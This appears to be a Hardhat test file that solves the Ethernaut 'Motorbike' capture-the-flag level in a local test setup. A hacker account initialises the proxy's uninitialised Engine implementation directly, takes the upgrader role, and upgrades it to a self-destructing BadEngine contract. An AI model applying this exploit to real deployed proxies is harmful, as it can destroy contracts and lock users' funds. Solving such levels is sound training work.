import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 25 - Motorbike contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const MotorbikeUUPSContract = await ethers.getContractFactory("Motorbike");
        const EngineLogicContract = await ethers.getContractFactory("Engine");

        const engine = await EngineLogicContract.deploy();
        const motorbike = await MotorbikeUUPSContract.deploy(await engine.getAddress());

        const iface = new ethers.Interface([
            "function upgrader()"
        ]);

        const motorbikeAttached = engine.attach(await motorbike.getAddress());

        expect(await motorbikeAttached.upgrader()).to.equal(owner.address);

        return {owner, hacker, motorbike, engine, motorbikeAttached};
    };
    
    describe("When hacking", () => {
        it("Hacker should call the implementation straightaway, upgrading to the bad engine contract and calling the selfdestruct method", async() => {
            const {owner, hacker, motorbike, engine, motorbikeAttached} = await loadFixture(setUp);

            // Hacker initializes the engine in its own execution context.
            expect(await engine.upgrader()).to.equal(ethers.ZeroAddress);

            await engine.connect(hacker).initialize();
            expect(await engine.upgrader()).to.equal(hacker.address);
            
            // Then he deploys the bad engine contract and upgrades engine to bad engine.
            const badEngine = await(await ethers.getContractFactory("BadEngine")).deploy();
            const badEngineInterface = new ethers.Interface(["function selfDestruct(address)"]);

            await engine.connect(hacker).upgradeToAndCall(await badEngine.getAddress(), badEngineInterface.encodeFunctionData("selfDestruct", [hacker.address]));
        });
    });
});